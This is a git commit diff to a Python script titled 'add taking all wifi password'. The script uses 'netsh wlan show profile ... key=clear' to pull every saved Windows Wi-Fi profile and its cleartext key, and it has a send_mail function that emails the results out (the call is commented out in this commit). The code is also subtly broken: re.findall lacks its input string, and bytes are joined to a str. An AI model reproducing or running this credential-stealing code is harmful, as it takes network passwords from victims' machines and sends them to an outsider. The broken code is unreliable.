c64b99d5b4372673d9a7b4a3edcb8dca33575d73
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-08-21 17:54:06 -0400

    add taking all wifi password

--- Execute_command/execute_command.py
+++ Execute_command/execute_command.py
@@ -1,6 +1,8 @@
 #!usr/bin/env python3
 
-import subprocess, smtplib
+import smtplib
+import subprocess
+import re
 
 
 def send_mail(email, password, message):
@@ -12,5 +14,12 @@ def send_mail(email, password, message):
 
 
 command = "netsh wlan show profile MYWIFI key=clear"
-result = subprocess.check_output(command, shell=True)
-send_mail("myemail@myemail.com", "mypassword", result)
+networks = subprocess.check_output(command, shell=True)
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)")
+
+result = ""
+for network_name in network_names_list:
+    command = "netsh wlan show profile " + network_name + " key=clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
+# send_mail("myemail@myemail.com", "mypassword", result)
